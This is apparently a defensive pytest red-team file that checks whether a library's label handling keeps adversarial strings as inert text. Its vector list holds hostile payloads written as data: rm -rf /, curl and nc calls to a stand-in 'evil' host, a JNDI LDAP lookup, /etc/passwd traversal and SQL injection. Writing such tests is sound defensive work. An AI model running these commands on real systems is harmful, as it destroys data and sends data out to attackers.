# Copyright (c) 2026 B-Tree Ventures, LLC
# SPDX-License-Identifier: Apache-2.0

"""Malicious-label stress.

Labels can come from user code (``labels=[...]``) or be inferred from
return statements. They flow into:
  - the ``Label.name`` attribute,
  - the auto_log JSON record,
  - telemetry payloads,
  - dispatch routing (label name -> on= callable).

For each adversarial vector we assert ONE of:
  - the label is accepted as opaque text and never executed /
    interpolated unsafely, OR
  - the label is refused with a clear error.

We never want: silent eval, silent path-component use, format-string
injection, or any handler invocation we didn't ask for.
"""

from __future__ import annotations

import pytest

from dendra import Label, LearnedSwitch

pytestmark = pytest.mark.redteam


def _rule(_):
    return "ok"


# Vectors collected from real-world attack patterns.
_LABEL_VECTORS = [
    # Newlines & control chars (log injection, JSON-line corruption)
    "label\nwith\nnewlines",
    "label\rwith\rcr",
    "carriage\r\nreturn",
    "\x00null\x00bytes",
    "tab\tseparated\tlabel",
    "\x01\x02\x03control",
    # Shell injection
    "'; rm -rf /'",
    "$(rm -rf /)",
    "`whoami`",
    "&& curl evil.com",
    "| nc evil 4444",
    # Format-string attacks
    "%s%s%s%s",
    "{0.__class__}",
    "{0.__class__.__bases__}",
    "%(password)s",
    # Template-engine injection
    "{{ 7 * 7 }}",
    "${jndi:ldap://evil.com/x}",
    # Path traversal in label
    "../etc/passwd",
    "/etc/passwd",
    # Method-name collision attempts
    "__init__",
    "__class__",
    "__getattribute__",
    "_evidence_x",
    "mark_correct",
    # Non-printable unicode
    "\x00\x01\x02",
    # Unicode bidi
    "safe‮evil",
    # Long blob
    "x" * 10240,
    # Empty after stripping
    "",
    "   ",
    # Quote-heavy
    '";DROP TABLE users;--',
]


@pytest.mark.parametrize("vector", _LABEL_VECTORS)
def test_label_accepted_as_opaque_or_refused(tmp_path, vector):
    """A malicious-string label must be accepted-as-opaque OR refused
    with a clear error. Never executed, never interpolated unsafely.
    """
    try:
        sw = LearnedSwitch(rule=_rule, labels=[vector], name="lbl-test")
    except (ValueError, TypeError):
        # Refusal is acceptable.
        return

    # If accepted, the stored label is bytewise the same string we passed.
    stored = [lbl.name for lbl in sw._labels_raw]
    assert vector in stored, f"label was silently transformed: passed {vector!r}, stored {stored!r}"


def test_label_method_collision_no_execution(tmp_path):
    """A label named "__class__" must NOT trigger attribute access on the switch.

    The switch's normal label-routing uses a dict lookup, not getattr, so
    a label named after a dunder cannot accidentally resolve to a method.
    """
    sw = LearnedSwitch(rule=_rule, labels=["__class__"], name="dunder")
    # Dispatch an input - must not raise, must not trigger __class__ access.
    result = sw.dispatch("anything")
    assert result.label == "ok"  # rule returns "ok", which isn't a registered label


def test_label_with_callable_does_not_eval_name(tmp_path):
    """Labels with on= callables must dispatch by exact name match,
    never via eval/getattr/exec on the label string.
    """
    fired = []

    def safe_handler(_):
        fired.append("ok")

    # Define a rule that returns the dangerous label so we can prove
    # the dispatch happens by string equality, not eval.
    def rule(_):
        return "$(rm -rf /)"

    sw = LearnedSwitch(
        rule=rule,
        labels=[Label(name="$(rm -rf /)", on=safe_handler)],
        name="cmd-injection-attempt",
    )
    result = sw.dispatch("anything")
    # Handler fired; nothing else happened. The shell metachars are inert.
    assert fired == ["ok"]
    assert result.action_raised is None


def test_label_collision_with_existing_method_name_segregated(tmp_path):
    """Even labels named after public switch methods (e.g. "dispatch")
    must not cause method lookup confusion.
    """
    fired = []

    sw = LearnedSwitch(
        rule=lambda _: "dispatch",
        labels=[Label(name="dispatch", on=lambda _: fired.append(1))],
        name="method-collision",
    )
    sw.dispatch("input")
    assert fired == [1]
    # And dispatch as a method still works the next call.
    sw.dispatch("input")
    assert fired == [1, 1]


def test_label_log_injection_does_not_break_jsonl(tmp_path):
    """A label containing a literal newline + JSON-looking junk must
    NOT corrupt the persisted JSON-lines file: each persisted line
    must remain valid JSON, and the label round-trips via the parser.
    """
    import json

    from dendra.storage import FileStorage

    storage = FileStorage(base_path=tmp_path / "store")
    sw = LearnedSwitch(
        rule=lambda _: 'evil\n{"fake":"record"}',
        labels=['evil\n{"fake":"record"}'],
        name="log-injection",
        storage=storage,
        config=None,
        # need auto_record on for the persistence path - easiest: dispatch with explicit verdict.
    )
    result = sw.dispatch("x")
    result.mark_correct()

    log_path = tmp_path / "store" / "log-injection" / "outcomes.jsonl"
    if not log_path.exists():
        pytest.skip("storage backend did not flush a file (expected for in-mem batching)")

    raw = log_path.read_text(encoding="utf-8")
    # Each non-empty line must be valid JSON.
    for line in raw.splitlines():
        if not line.strip():
            continue
        record = json.loads(line)
        # If the label round-trips, it's preserved exactly. The "fake"
        # injection key must NOT have become a top-level field on its own.
        # (It may live inside the "label" or "input" string field.)
        assert "fake" not in record or record.get("label") == 'evil\n{"fake":"record"}'
